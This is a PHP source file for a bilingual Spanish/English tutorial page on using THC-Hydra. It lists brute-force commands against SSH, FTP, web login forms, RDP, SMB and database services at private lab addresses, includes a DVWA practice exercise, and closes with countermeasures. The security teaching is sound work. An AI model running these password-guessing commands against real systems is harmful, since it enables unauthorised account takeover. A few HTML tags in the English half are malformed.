<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Hydra: Ataques de Fuerza Bruta — CyberEscudo' : 'Hydra: Brute Force Attacks — CyberEscudo';
$contentTitle = $lang==='es' ? 'Hydra: Ataques de Fuerza Bruta' : 'Hydra: Brute Force Attacks';
$contentDate  = '2022-03-15';
$contentTags  = ['Hydra','Fuerza Bruta','Contraseñas','SSH','FTP','HTTP'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p><strong>THC-Hydra</strong> es la herramienta de fuerza bruta online más rápida y versátil, compatible con más de 50 protocolos: SSH, FTP, HTTP, SMB, RDP, MySQL, etc.</p>

  <h2>Sintaxis general</h2>
  <pre><code>hydra [opciones] -l usuario -P diccionario.txt [IP] [protocolo]</code></pre>

  <h2>1. Fuerza bruta SSH</h2>
  <pre><code># Usuario conocido, diccionario de contraseñas:
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Lista de usuarios + diccionario:
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Con puerto no estándar:
hydra -l admin -P pass.txt -s 2222 ssh://192.168.1.10

# Aumentar threads (más rápido):
hydra -l root -P pass.txt -t 16 ssh://192.168.1.10</code></pre>

  <h2>2. Fuerza bruta FTP</h2>
  <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10
hydra -L users.txt -P pass.txt ftp://192.168.1.10 -V</code></pre>

  <h2>3. Fuerza bruta HTTP (formulario web)</h2>
  <pre><code># HTTP POST (login form):
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET:
hydra -l admin -P pass.txt \
  192.168.1.10 http-get-form \
  "/login:user=^USER^&pass=^PASS^:Login failed"

# Con cookie de sesión:
hydra -l admin -P pass.txt \
  192.168.1.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:error:H=Cookie: PHPSESSID=abc123"</code></pre>

  <h2>4. Fuerza bruta RDP, SMB, MySQL</h2>
  <pre><code># RDP (Windows Remote Desktop):
hydra -l Administrator -P pass.txt rdp://192.168.1.10

# SMB (Windows file sharing):
hydra -l Administrator -P pass.txt smb://192.168.1.10

# MySQL:
hydra -l root -P pass.txt mysql://192.168.1.10

# PostgreSQL:
hydra -l postgres -P pass.txt postgres://192.168.1.10</code></pre>

  <h2>5. DVWA — Práctica de fuerza bruta HTTP</h2>
  <pre><code># DVWA nivel low — fuerza bruta al login:
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.0.2.4 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=tu_session_id; security=low"</code></pre>

  <h2>6. Opciones importantes</h2>
  <table>
    <thead><tr><th>Flag</th><th>Descripción</th></tr></thead>
    <tbody>
      <tr><td><code>-l</code></td><td>Usuario único</td></tr>
      <tr><td><code>-L</code></td><td>Archivo con lista de usuarios</td></tr>
      <tr><td><code>-p</code></td><td>Contraseña única</td></tr>
      <tr><td><code>-P</code></td><td>Archivo diccionario de contraseñas</td></tr>
      <tr><td><code>-t</code></td><td>Número de threads paralelos (default: 16)</td></tr>
      <tr><td><code>-s</code></td><td>Puerto alternativo</td></tr>
      <tr><td><code>-V</code></td><td>Verbose: mostrar cada intento</td></tr>
      <tr><td><code>-o</code></td><td>Guardar resultados en archivo</td></tr>
      <tr><td><code>-f</code></td><td>Parar al encontrar la primera credencial válida</td></tr>
      <tr><td><code>-x</code></td><td>Generación dinámica de contraseñas</td></tr>
    </tbody>
  </table>

  <h2>Contramedidas</h2>
  <ul>
    <li><strong>Fail2Ban:</strong> bloquea IPs tras N intentos fallidos.</li>
    <li><strong>Límite de intentos:</strong> máximo 3-5 intentos antes de bloqueo temporal.</li>
    <li><strong>CAPTCHA:</strong> en formularios de login.</li>
    <li><strong>2FA/MFA:</strong> autenticación multifactor.</li>
    <li><strong>Contraseñas seguras:</strong> mínimo 12 caracteres, letras, números y símbolos.</li>
  </ul>
</div>
<?php else: ?>
<div class="prose">
  <p><strong>THC-Hydra</strong> is the fastest and most versatile online brute-force tool, supporting 50+ protocols: SSH, FTP, HTTP, SMB, RDP, MySQL, and many more.</p>

  <h2>General Syntax</h2>
  <pre><code>hydra [options] -l user -P wordlist.txt [IP] [protocol]</code></pre>

  <h2>1. SSH Brute Force</h2>
  <pre><code># Known username, password wordlist:
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Username list + wordlist:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Non-standard port:
hydra -l admin -P pass.txt -s 2222 ssh://192.168.1.10

# Increase threads (faster):
hydra -l root -P pass.txt -t 16 ssh://192.168.1.10</code></pre>

  <h2>2. FTP Brute Force</h2>
  <pre><code">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10
hydra -L users.txt -P pass.txt ftp://192.168.1.10 -V</code></pre>

  <h2>3. HTTP Form Brute Force</h2>
  <pre><code># HTTP POST (login form):
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET:
hydra -l admin -P pass.txt \
  192.168.1.10 http-get-form \
  "/login:user=^USER^&pass=^PASS^:Login failed"

# With session cookie:
hydra -l admin -P pass.txt \
  192.168.1.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:error:H=Cookie: PHPSESSID=abc123"</code></pre>

  <h2>4. RDP, SMB, MySQL Brute Force</h2>
  <pre><code"># RDP (Windows Remote Desktop):
hydra -l Administrator -P pass.txt rdp://192.168.1.10

# SMB (Windows file sharing):
hydra -l Administrator -P pass.txt smb://192.168.1.10

# MySQL:
hydra -l root -P pass.txt mysql://192.168.1.10</code></pre>

  <h2>5. DVWA Practice — HTTP Brute Force</h2>
  <pre><code">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.0.2.4 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=your_session; security=low"</code></pre>

  <h2>6. Key Options</h2>
  <table>
    <thead><tr><th>Flag</th><th>Description</th></tr></thead>
    <tbody>
      <tr><td><code>-l</code></td><td>Single username</td></tr>
      <tr><td><code>-L</code></td><td>Username list file</td></tr>
      <tr><td><code>-p</code></td><td>Single password</td></tr>
      <tr><td><code>-P</code></td><td>Password wordlist file</td></tr>
      <tr><td><code>-t</code></td><td>Parallel threads (default: 16)</td></tr>
      <tr><td><code>-s</code></td><td>Alternative port</td></tr>
      <tr><td><code>-V</code></td><td>Verbose: show each attempt</td></tr>
      <tr><td><code>-o</code></td><td>Save results to file</td></tr>
      <tr><td><code>-f</code></td><td>Stop after first valid credential found</td></tr>
    </tbody>
  </table>

  <h2>Countermeasures</h2>
  <ul>
    <li><strong>Fail2Ban:</strong> automatically blocks IPs after N failed attempts.</li>
    <li><strong>Rate limiting:</strong> max 3–5 attempts before temporary lockout.</li>
    <li><strong>CAPTCHA:</strong> on login forms to block automated tools.</li>
    <li><strong>MFA/2FA:</strong> multi-factor authentication defeats stolen passwords.</li>
    <li><strong>Strong passwords:</strong> 12+ characters with mixed case, numbers and symbols.</li>
  </ul>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
